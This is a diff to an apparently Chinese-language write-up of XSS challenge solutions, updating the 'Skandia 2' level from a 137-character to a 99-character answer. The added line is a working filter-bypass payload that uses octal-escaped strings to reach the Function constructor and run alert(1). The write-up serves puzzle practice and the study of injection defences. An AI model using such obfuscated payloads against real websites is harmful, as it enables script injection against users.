@@ -20,7 +20,7 @@
 > - [x]  <a href="#a009">Template (24)</a>
 > - [x]  <a href="#a010">JSON 2 (35)</a>
 > - [x]  <a href="#a011">Callback 2 (16)</a>
-> - [x]  <a href="#a012">Skandia 2 (137)</a>
+> - [x]  <a href="#a012">Skandia 2 (99)</a>
 > - [x]  <a href="#a013">iframe</a>
 > - [x]  <a href="#a014">TI(S)M (25)</a>
 > - [x]  <a href="#a015">JSON 3 (29)</a>
@@ -342,7 +342,7 @@ Output
 ```
 
 <a name="a012"/></a>
-### Skandia 2 (137)
+### Skandia 2 (99)
 花了我两个小时才用137字符完成了这题。
 ```javascript
 function escape(s) {
@@ -387,6 +387,10 @@ alert          =>    _[1]+_[2]+_[4]+_[38]+_[9]
 "falsefunction URL() {
     [native code]
 }true"
+```
+2018-10-12 99字符 
+```
+"|[]['\160\157\160']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()|"
 ```
 
 <a name="a013"/></a>
